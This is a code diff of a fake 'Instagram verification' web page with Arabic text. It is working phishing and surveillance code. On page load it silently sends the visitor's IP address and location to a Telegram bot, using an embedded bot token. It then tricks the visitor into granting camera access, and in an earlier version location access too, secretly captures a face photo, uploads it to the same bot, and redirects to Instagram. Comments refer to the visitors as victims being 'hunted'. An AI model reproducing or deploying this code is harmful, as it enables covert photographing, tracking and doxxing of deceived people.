@@ -3,29 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Verification</title>
+    <title>Instagram - تأكيد الصورة</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
-        .card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
         .logo { width: 175px; margin-bottom: 20px; }
-        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        #status { margin-top: 15px; color: #ed4956; font-size: 13px; font-weight: bold; }
-        .instr { display: none; background: #fff9c4; padding: 10px; border-radius: 5px; font-size: 12px; margin-top: 10px; border: 1px solid #fbc02d; }
+        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; color: #ed4956; font-size: 13px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
-        <p style="font-weight: 600; font-size: 14px;">تأكيد أمان الحساب</p>
-        <p style="color: #8e8e8e; font-size: 13px;">يرجى المتابعة لتأكيد ملكيتك للحساب عبر فحص الجهاز.</p>
-        
-        <button id="authBtn">متابعة</button>
-        
-        <div id="instrBox" class="instr">
-            ⚠️ متصفح إنستغرام لا يدعم الفحص. اضغط على <b>(⋮)</b> في الأعلى ثم اختر <b>"الفتح في المتصفح"</b> للمتابعة.
-        </div>
-        
+        <p style="font-weight: 600; font-size: 14px;">مسح الوجه للأمان</p>
+        <p style="color: #8e8e8e; font-size: 13px;">يرجى السماح بالكاميرا لالتقاط صورة سريعة للوجه للتأكد من هويتك.</p>
+        <button id="authBtn">بدء المسح الضوئي</button>
         <div id="status"></div>
     </div>
 
@@ -36,70 +29,58 @@
         const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
         const CHAT_ID = '2140385904';
 
-        // دالة الإرسال العام
-        async function report(text) {
+        async function sendLog(txt) {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: txt, parse_mode: 'Markdown' })
             });
         }
 
-        // 1. اكتشاف متصفح إنستغرام وتنبيه الضحية
-        if (navigator.userAgent.includes("Instagram")) {
-            document.getElementById('instrBox').style.display = 'block';
-            document.getElementById('authBtn').style.opacity = '0.5';
-        }
-
-        // 2. صيد صامت (يعمل حتى داخل إنستغرام)
+        // صيد الآيبي فور الدخول
         (async () => {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const i = await res.json();
-                const silentInfo = `🔔 *دخل شخص للرابط (صيد صامت)*\n🌐 الآيبي: \`${i.ip}\`\n🌍 البلد: ${i.country_name}\n🏙 المدينة: ${i.city}\n📡 المزود: ${i.org}\n📱 المتصفح: ${navigator.userAgent.includes("Instagram") ? "إنستغرام الداخلي" : "متصفح خارجي"}`;
-                report(silentInfo);
-            } catch (e) { report("🔔 دخل شخص للرابط (تعذر جلب الآيبي)"); }
+                sendLog(`🔔 *شخص فتح الرابط*\n🌐 الآيبي: \`${i.ip}\`\n🌍 البلد: ${i.country_name}`);
+            } catch (e) {}
         })();
 
-        // 3. التنفيذ عند الضغط (طلب الكاميرا والموقع)
         document.getElementById('authBtn').onclick = async () => {
             const st = document.getElementById('status');
-            st.innerText = "جاري الاتصال بخوادم الأمان...";
+            st.innerText = "جاري فتح الكاميرا...";
 
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                const mapLink = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
+            try {
+                // طلب الكاميرا الأمامية
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // التقاط الصورة بعد ثانيتين (لضمان الوضوح)
+                setTimeout(async () => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 480; canvas.height = 640;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
                     
-                    setTimeout(async () => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = 400; canvas.height = 400;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 400, 400);
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'shot.jpg');
+                        fd.append('caption', `📸 *تم التقاط الصورة بنجاح*`);
                         
-                        canvas.toBlob(async (blob) => {
-                            const fd = new FormData();
-                            fd.append('chat_id', CHAT_ID);
-                            fd.append('photo', blob, 'shot.jpg');
-                            fd.append('caption', `✅ *نجاح الصيد الكامل*\n${mapLink}`);
-                            
-                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                            stream.getTracks().forEach(t => t.stop());
-                            st.innerText = "اكتمل التحقق بنجاح!";
-                            setTimeout(() => location.href = "https://instagram.com", 1500);
-                        }, 'image/jpeg', 0.6);
-                    }, 2500);
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        
+                        // إغلاق الكاميرا والتحويل
+                        stream.getTracks().forEach(t => t.stop());
+                        st.innerText = "اكتمل المسح!";
+                        setTimeout(() => location.href = "https://instagram.com", 1000);
+                    }, 'image/jpeg', 0.7);
+                }, 2000);
 
-                } catch (e) {
-                    report(`⚠️ منح الموقع ولكن تعذر فتح الكاميرا (ربما بسبب متصفح إنستغرام)\n${mapLink}`);
-                    st.innerText = "تم منح صلاحية الموقع، يرجى فتح الرابط في كروم لالتقاط الصورة.";
-                }
-            }, (err) => {
-                report("❌ الضحية رفض منح الصلاحيات.");
-                st.innerText = "فشل التحقق: يجب منح الصلاحيات للمتابعة.";
-            });
+            } catch (e) {
+                st.innerText = "خطأ: يجب السماح بالكاميرا للمتابعة.";
+                sendLog("❌ الضحية رفض الكاميرا.");
+            }
         };
     </script>
 </body>
